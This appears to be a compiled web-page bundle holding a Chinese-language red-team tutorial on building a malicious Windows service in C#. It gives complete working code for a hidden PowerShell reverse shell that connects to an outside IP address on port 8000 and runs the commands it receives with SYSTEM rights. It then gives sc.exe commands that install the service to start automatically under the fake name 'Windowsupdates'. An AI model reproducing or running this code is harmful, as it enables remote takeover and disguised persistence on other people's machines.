"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[5015],{1536:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>d,contentTitle:()=>c,default:()=>u,frontMatter:()=>o,metadata:()=>t,toc:()=>l});const t=JSON.parse('{"id":"Security/windowsservice","title":"\u5982\u4f55\u4f7f\u7528 C# \u5275\u5efa\u60e1\u610f Windows \u670d\u52d9\u4f86\u56de\u5f48\u7cfb\u7d71\u6b0a\u9650\u7684 shell","description":"\u5982\u4f55\u4f7f\u7528 C# \u5275\u5efa\u60e1\u610f Windows \u670d\u52d9\u4f86\u56de\u5f48\u7cfb\u7d71\u6b0a\u9650\u7684 shell","source":"@site/docs/Security/windowsservice.mdx","sourceDirName":"Security","slug":"/Security/windowsservice","permalink":"/RulerChen-Website/docs/Security/windowsservice","draft":false,"unlisted":false,"editUrl":"https://github.com/RulerChen/RulerChen-Website/tree/main/docs/Security/windowsservice.mdx","tags":[],"version":"current","lastUpdatedAt":1727616702000,"sidebarPosition":20,"frontMatter":{"title":"\u5982\u4f55\u4f7f\u7528 C# \u5275\u5efa\u60e1\u610f Windows \u670d\u52d9\u4f86\u56de\u5f48\u7cfb\u7d71\u6b0a\u9650\u7684 shell","sidebar_position":20,"description":"\u5982\u4f55\u4f7f\u7528 C# \u5275\u5efa\u60e1\u610f Windows \u670d\u52d9\u4f86\u56de\u5f48\u7cfb\u7d71\u6b0a\u9650\u7684 shell","keywords":["Windows Service","C#","Shell"]},"sidebar":"tutorialSidebar","previous":{"title":"[CVE-2021-44228] log4j \u6f0f\u6d1e\u5fa9\u73fe","permalink":"/RulerChen-Website/docs/Security/log4j"},"next":{"title":"CMU15-445","permalink":"/RulerChen-Website/docs/CMU15-445/"}}');var i=s(74848),r=s(28453);const o={title:"\u5982\u4f55\u4f7f\u7528 C# \u5275\u5efa\u60e1\u610f Windows \u670d\u52d9\u4f86\u56de\u5f48\u7cfb\u7d71\u6b0a\u9650\u7684 shell",sidebar_position:20,description:"\u5982\u4f55\u4f7f\u7528 C# \u5275\u5efa\u60e1\u610f Windows \u670d\u52d9\u4f86\u56de\u5f48\u7cfb\u7d71\u6b0a\u9650\u7684 shell",keywords:["Windows Service","C#","Shell"]},c=void 0,d={},l=[{value:"\u6982\u8ff0",id:"\u6982\u8ff0",level:2},{value:"\u6b65\u9a5f",id:"\u6b65\u9a5f",level:2},{value:"\u53c3\u8003",id:"\u53c3\u8003",level:2}];function a(e){const n={a:"a",code:"code",h2:"h2",li:"li",p:"p",pre:"pre",ul:"ul",...(0,r.R)(),...e.components},{Head:s}=n;return s||function(e,n){throw new Error("Expected "+(n?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}("Head",!0),(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(s,{children:(0,i.jsx)("title",{children:"\u5982\u4f55\u4f7f\u7528 C# \u5275\u5efa\u60e1\u610f Windows \u670d\u52d9\u4f86\u56de\u5f48\u7cfb\u7d71\u6b0a\u9650\u7684 shell"})}),"\n",(0,i.jsx)(n.h2,{id:"\u6982\u8ff0",children:"\u6982\u8ff0"}),"\n",(0,i.jsx)(n.p,{children:"\u672c\u6587\u627f\u63a5\u4e0a\u4e00\u7bc7 log4j \u7684\u5be6\u4f5c\uff0c\u4f7f\u7528 C# (Visual Studio 2022) \u4f86\u5275\u5efa\u4e00\u500b\u60e1\u610f\u7684 Windows \u670d\u52d9\uff0c\u7528\u4f86\u56de\u5f48\u4e00\u500b\u7cfb\u7d71\u6b0a\u9650\u7684 shell\u3002"}),"\n",(0,i.jsx)(n.h2,{id:"\u6b65\u9a5f",children:"\u6b65\u9a5f"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"\u4f9d\u64da\u4e0b\u65b9\u7684\u5f71\u7247\u5148\u5efa\u7acb\u7c21\u55ae\u7684 windows service"}),"\n",(0,i.jsx)(n.li,{children:"\u5728 .cs \u6a94\u6848\u4e0b\u65b0\u589e\u4ee5\u4e0b\u7a0b\u5f0f\u78bc"}),"\n"]}),"\n",(0,i.jsxs)(n.p,{children:["\u7531\u65bc windows service \u672c\u8eab\u5c31\u5728 admin \u6b0a\u9650\u4e0b\u57f7\u884c\uff0c\u6240\u4ee5\u4e0d\u9700\u8981 ",(0,i.jsx)(n.code,{children:"UAC"})," \u7684\u6b0a\u9650\u63d0\u5347\u3002"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-csharp",children:'using System;\nusing System.Diagnostics;\nusing System.IO;\nusing System.ServiceProcess;\n\nnamespace service\n{\n    public partial class Service1 : ServiceBase\n    {\n        public Service1()\n        {\n            InitializeComponent();\n        }\n\n        protected override void OnStart(string[] args)\n        {\n            try\n            {\n                System.Threading.Thread.Sleep(100000);\n\n                string payload = $@"\n                    $client = New-Object System.Net.Sockets.TCPClient(\'104.199.254.153\', 8000);\n                    $stream = $client.GetStream();\n                    $writer = New-Object System.IO.StreamWriter($stream);\n                    $reader = New-Object System.IO.StreamReader($stream);\n                    $writer.AutoFlush = $true;\n                    while ($true) {{\n                        $command = $reader.ReadLine();\n                        if ($command -eq \'exit\') {{ break }}\n                        $output = try {{ Invoke-Expression $command 2>&1 | Out-String }} catch {{ $_.Exception.Message }};\n                        $writer.WriteLine($output);\n                    }}\n                    $client.Close();";\n\n                ExecuteCommand(payload);\n            }\n            catch (Exception ex)\n            {\n                Console.WriteLine(ex.ToString());\n            }\n        }\n\n        protected override void OnStop()\n        {\n        }\n\n        private void ExecuteCommand(string command)\n        {\n            try\n            {\n                ProcessStartInfo psi = new ProcessStartInfo\n                {\n                    FileName = "powershell.exe",\n                    Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command " + command,\n                    CreateNoWindow = true,\n                    UseShellExecute = false,\n                    RedirectStandardOutput = true,\n                    RedirectStandardError = true\n                };\n\n                using (Process process = new Process { StartInfo = psi })\n                {\n                    process.Start();\n                    string output = process.StandardOutput.ReadToEnd();\n                    string error = process.StandardError.ReadToEnd();\n                    process.WaitForExit();\n                }\n            }\n            catch (Exception ex)\n            {\n                // \u8655\u7406\u7570\u5e38\n                Console.WriteLine("\u57f7\u884c PowerShell \u6307\u4ee4\u6642\u767c\u751f\u932f\u8aa4: " + ex.Message);\n            }\n        }\n    }\n}\n'})}),"\n",(0,i.jsxs)(n.p,{children:["build \u4e4b\u5f8c ",(0,i.jsx)(n.code,{children:"service/bin/Debug/service.exe"})," \u9019\u500b\u6a94\u6848\u5c31\u662f\u6211\u5011\u7684\u60e1\u610f windows service\uff0c\u6211\u5011\u53ef\u4ee5\u5c07\u5176\u653e\u5230\u76ee\u6a19\u6a5f\u5668\u4e0a\u57f7\u884c\u3002"]}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["\u5c07 ",(0,i.jsx)(n.code,{children:"service.exe"})," \u653e\u5230\u76ee\u6a19\u6a5f\u5668\u4e0a\uff0c\u4e26\u507d\u88dd\u6210\u5408\u6cd5\u7684\u670d\u52d9\u540d\u7a31"]}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'& "C:\\Windows\\System32\\sc.exe" create Windowsupdates binPath= "C:\\Users\\redteam\\Desktop\\service.exe" start= auto obj= LocalSystem DisplayName= "windowsupdates"\n'})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'& "C:\\Windows\\System32\\sc.exe" start Windowsupdates\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u5982\u679c\u9700\u8981\u522a\u9664\u670d\u52d9\uff0c\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u6307\u4ee4"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'& "C:\\Windows\\System32\\sc.exe" stop Windowsupdates\n& "C:\\Windows\\System32\\sc.exe" delete Windowsupdates\n'})}),"\n",(0,i.jsx)(n.h2,{id:"\u53c3\u8003",children:"\u53c3\u8003"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"https://www.youtube.com/watch?v=67DtZbPYNKg",children:"How to Create a Windows Service Using C# and Visual Studio!"})}),"\n"]})]})}function u(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(a,{...e})}):a(e)}},28453:(e,n,s)=>{s.d(n,{R:()=>o,x:()=>c});var t=s(96540);const i={},r=t.createContext(i);function o(e){const n=t.useContext(r);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:o(e.components),t.createElement(r.Provider,{value:n},e.children)}}}]);